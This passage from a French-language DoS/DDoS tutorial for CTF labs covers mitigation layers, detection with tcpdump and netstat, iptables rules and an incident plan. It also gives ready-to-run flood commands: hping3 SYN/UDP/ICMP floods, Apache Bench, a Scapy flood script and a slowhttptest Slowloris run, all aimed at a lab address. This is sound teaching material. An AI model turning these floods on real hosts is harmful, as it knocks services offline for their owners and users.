# 4. ModSecurity pour Apache
sudo apt-get install libapache2-mod-security2
```

### Défense Organisationnelle

```
1. ISP-level Protection
   └─ Provider peut filtrer à leur niveau
      Avant que ça atteigne ton serveur

2. WAF (Web Application Firewall)
   └─ Cloudflare, AWS WAF, Imperva
      Absorbe l'attaque sur leurs infra

3. DDoS Mitigation Service
   └─ Akamai, Cloudflare, AWS Shield
      Route le trafic via leurs datacenters

4. Over-provisioning
   └─ Avoir 10x la bande qu'on utilise
      Peut supporter 10x l'attaque normale

5. Content Delivery Network (CDN)
   └─ Netflix utilise CDN partout
      Même si Netflix.com attaqué, les vidéos viennent des caches
```

---

## Outils pour tester DoS

### 1. hping3 (SYN/UDP Flood)

```bash
# Installation
sudo apt-get install hping3 -y

# SYN Flood
sudo hping3 -S --flood -p 31337 10.0.0.2

# UDP Flood
sudo hping3 -2 --flood -p 31337 10.0.0.2

# ICMP Flood
sudo hping3 -1 --flood 10.0.0.2

# Avec délai contrôlé
sudo hping3 -S -p 31337 --interval 10 10.0.0.2
# 1 paquet toutes les 10ms
```

### 2. Apache Bench (HTTP Flood)

```bash
# Installation
sudo apt-get install apache2-utils -y

# Simple flood
ab -n 10000 -c 100 http://10.0.0.2:31337/

# Avec en-tête personnalisé
ab -n 10000 -c 100 -H "Authorization: Bearer token" http://10.0.0.2:31337/

# Options:
# -n: nombre total de requêtes
# -c: nombre de requêtes concurrentes
# -t: durée du test en secondes
```

### 3. wrk (HTTP Load Testing)

```bash
# Installation
git clone https://github.com/wg/wrk.git
cd wrk && make

# Utilisation
./wrk -t4 -c100 -d30s http://10.0.0.2:31337/

# Options:
# -t: nombre de threads
# -c: nombre de connexions
# -d: durée du test
```

### 4. Scapy (Custom packets)

```python
#!/usr/bin/env python3
from scapy.all import *

# SYN Flood via Scapy
for i in range(1000):
    packet = IP(dst="10.0.0.2")/TCP(dport=31337, flags="S")
    send(packet)

# UDP Flood
for i in range(1000):
    packet = IP(dst="10.0.0.2")/UDP(dport=31337)/Raw(load="X"*100)
    send(packet)

# ICMP Flood
for i in range(1000):
    packet = IP(dst="10.0.0.2")/ICMP()
    send(packet)
```

### 5. slowhttptest (Slowloris)

```bash
# Installation
git clone https://github.com/shekyan/slowhttptest.git
cd slowhttptest && ./configure && make

# Slowloris attack
./slowhttptest -c 1000 -H -g -o my_results -i 10 -r 200 -t GET -u http://10.0.0.2:31337 -x 24 -p 3
```

### 6. tcpdump (Analyse)

```bash
# Capturer le trafic
sudo tcpdump -i eth0 -n -w capture.pcap

# Analyser les paquets SYN
sudo tcpdump -i eth0 -n "tcp[tcpflags] & tcp-syn != 0"

# Analyser les paquets UDP
sudo tcpdump -i eth0 -n "udp"

# Analyser les paquets ICMP
sudo tcpdump -i eth0 -n "icmp"

# Filtrer par IP source
sudo tcpdump -i eth0 -n "src 10.0.0.3"
```

---

## Challenges pratiques

### Challenge 1 : Détecter une attaque SYN Flood

**Situation:**
- Serveur 10.0.0.2 reçoit une attaque SYN Flood depuis 10.0.0.3
- Service sur port 31337 devient inaccessible
- Tu dois identifier et confirmer l'attaque

**Tâche:**
```bash
1. Voir combien de connexions SYN_RECV existent
   sudo netstat -an | grep SYN_RECV | wc -l
   # Devrait montrer un nombre élevé (>1000)

2. Identifier l'IP attaquante
   sudo netstat -an | grep SYN_RECV | awk '{print $5}' | cut -d: -f1 | sort | uniq -c
   # Devrait montrer 10.0.0.3 avec beaucoup de connexions

3. Confirmer avec tcpdump
   sudo tcpdump -i eth0 -n "tcp[tcpflags] & tcp-syn != 0 and src 10.0.0.3" | head -50
   # Devrait montrer des milliers de SYN depuis 10.0.0.3
```

### Challenge 2 : Bloquer une attaque DoS

**Situation:**
- Client 10.0.0.3 attaque serveur 10.0.0.2:31337
- Tu dois bloquer cette communication

**Solution:**
```bash
# Bloquer complètement l'attaquant
sudo iptables -A INPUT -s 10.0.0.3 -d 10.0.0.2 -p tcp --dport 31337 -j DROP

# Vérifier
sudo iptables -L INPUT -n | grep 10.0.0.3

# Tester que ça marche (depuis 10.0.0.3)
nc -v 10.0.0.2 31337  # Devrait timeout ou être rejeté
```

### Challenge 3 : Mettre en place une défense SYN Flood

**Situation:**
- Activer les défenses contre SYN Flood
- Permettre encore aux utilisateurs légitimes de se connecter

**Solution:**
```bash
# 1. Activer SYN Cookies
sudo sysctl -w net.ipv4.tcp_syncookies=1

# 2. Augmenter SYN Queue
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096

# 3. Rate limiting pour SYN
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# 4. Tester (devrait toujours pouvoir se connecter)
nc -v 10.0.0.2 31337  # Devrait marcher
```

### Challenge 4 : Identifier le type d'attaque

**Situation:**
- Tu observes du trafic suspect
- Tu dois identifier si c'est: SYN Flood, UDP Flood, HTTP Flood, ou Slowloris

**Tâches:**
```bash
# Capturer le trafic
sudo tcpdump -i eth0 -n -w capture.pcap "src 10.0.0.3"

# Analyser dans Wireshark (ou en CLI):

# SYN Flood:
sudo tcpdump -r capture.pcap "tcp[tcpflags] & tcp-syn != 0"
# Beaucoup de SYN avec peu d'ACK

# UDP Flood:
sudo tcpdump -r capture.pcap "udp"
# Beaucoup de paquets UDP

# HTTP Flood:
sudo tcpdump -r capture.pcap "tcp port 80 or tcp port 8080"
# Requêtes HTTP GET/POST

# Slowloris:
sudo tcpdump -r capture.pcap "tcp"
# Connexions ouvertes longtemps mais peu d'activité
```

### Challenge 5 : Simulation Contrôlée d'Attaque

**Situation:**
- Environnement lab autorisé
- Tu dois générer du trafic DoS et observer l'impact

**Étapes:**
```bash
# 1. Terminal 1 - Monitoring
watch -n 1 'netstat -an | wc -l'

# 2. Terminal 2 - Générer trafic
sudo hping3 -S --flood -p 31337 10.0.0.2

# 3. Observation:
# - Connexions montent rapidement
# - Service devient inaccessible
# - CPU augmente

# 4. Terminal 3 - Bloquer l'attaque
sudo iptables -A INPUT -s $(whoami_ip) -j DROP

# 5. Observation:
# - Connexions redescendent
# - Service redevient accessible
```

---

## Bonnes pratiques

### 1. Planification de la Défense

```
Avant une attaque DoS:
├─ Audit de capacity (combien on peut supporter)
├─ Planification de escalade
├─ Mise en place de monitoring
├─ Plans de mitigation documentés
├─ Tests de simulation
└─ Communication (qui appeler si attaque)
```

### 2. Architecture Résiliente

```
┌─────────────────────────────────────┐
│       Load Balancer / Reverse Proxy  │
│  (Absorbe et distribue)              │
└──────┬──────────┬──────────┬─────────┘
       │          │          │
   ┌───▼──┐   ┌──▼───┐   ┌──▼───┐
   │Server│   │Server│   │Server│
   │  1   │   │  2   │   │  3   │
   └──────┘   └──────┘   └──────┘

Attaque sur un serveur ne tue pas les autres
Charge distribuée
```

### 3. Monitoring Continu

```bash
# Script de monitoring automatisé
#!/bin/bash

while true; do
    connections=$(netstat -an | wc -l)
    syn_recv=$(netstat -an | grep SYN_RECV | wc -l)
    cpu=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    
    # Alertes
    if [ $syn_recv -gt 1000 ]; then
        echo "ALERTE: SYN Flood possible (SYN_RECV=$syn_recv)"
        # Ajouter action automatique
        # sudo iptables ...
    fi
    
    if (( $(echo "$cpu > 80" | bc -l) )); then
        echo "ALERTE: CPU élevé ($cpu%)"
    fi
    
    sleep 10
done
```

### 4. Rate Limiting Multi-niveaux

```
Niveau 1: ISP/Carrier
└─ Ingress filtering, anti-spoofing

Niveau 2: Firewall Perimetral
└─ iptables, rate limiting, ACLs

Niveau 3: Load Balancer
└─ Distribution, connection pooling

Niveau 4: Application
└─ Nginx limit_req, timeouts, validation

Niveau 5: Database
└─ Connection pooling, query limits
```

### 5. Plan d'Incident

```
Si attaque DoS détectée:
├─ [0min] Vérifier que c'est une vraie attaque
├─ [5min] Activer les défenses (rate limiting, SYN Cookies)
├─ [15min] Bloquer l'IP attaquante si identifiée
├─ [30min] Contacter ISP/DDoS mitigation service
├─ [1h] Analyser pour les patterns
├─ [2h] Documenter et post-mortem
└─ [Permanent] Mettre à jour les défenses
```

---

## Ressources supplémentaires

### Documentation
- [NIST Guide on DDoS Protection](https://nvlpubs.nist.gov/nistpubs/)
- [Cloudflare Learning - DDoS](https://www.cloudflare.com/learning/ddos/)
- [OWASP - DoS](https://owasp.org/www-community/attacks/Denial_of_Service)

### Outils
- hping3: `man hping3`
- iptables: `man iptables`
- tcpdump: `man tcpdump`
- Wireshark: Interface GUI pour analyser captures

### Livres
- "The Art of Intrusion" - Kevin Mitnick
- "Networked Systems" - Andrew Tanenbaum

---

## Résumé rapide

### Types d'attaques DoS

| Type | Couche | Impact | Défense |
|------|--------|--------|---------|
| **SYN Flood** | 4 (TCP) | Connexions épuisées | SYN Cookies, rate limiting |
| **UDP Flood** | 4 (UDP) | Bande saturée | Filtrer UDP, rate limiting |
| **ICMP Flood** | 3 (ICMP) | Bande saturée | Bloquer ICMP, rate limiting |
| **HTTP Flood** | 7 (App) | Ressources app | WAF, rate limiting app |
| **Slowloris** | 7 (App) | Connexions app | Timeouts agressifs |
| **Amplification** | 3-7 | Très gros volume | Filtrer réflecteurs |
| **DDoS** | Tous | Très difficile | Mitigation service |

### Commandes essentielles

```bash
# Détection
sudo netstat -an | grep SYN_RECV | wc -l
sudo netstat -an | awk '{print $5}' | sort | uniq -c | sort -rn

# Défense
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
sudo iptables -A INPUT -s 10.0.0.3 -j DROP

# Test
sudo hping3 -S --flood -p 31337 10.0.0.2
ab -n 10000 -c 100 http://10.0.0.2:31337/
```

---

## Conclusion

Les attaques DoS et DDoS sont parmi les plus courantes et les plus dommageables en cybersécurité. Une bonne compréhension des mécanismes d'attaque est essentielle pour mettre en place des défenses efficaces.

**Points clés à retenir:**
1. DoS = Une source, DDoS = Plusieurs sources
2. Couches basses (3/4) = Flood attacks, Couches hautes (7) = App attacks
3. Défense = Monitoring + Rate limiting + Mitigation service
4. Toujours tester les défenses en simulation avant une vraie attaque
5. Les vraies attaques DDoS nécessitent une service spécialisé

Bonne chance pour tes challenges CTF ! 🎯
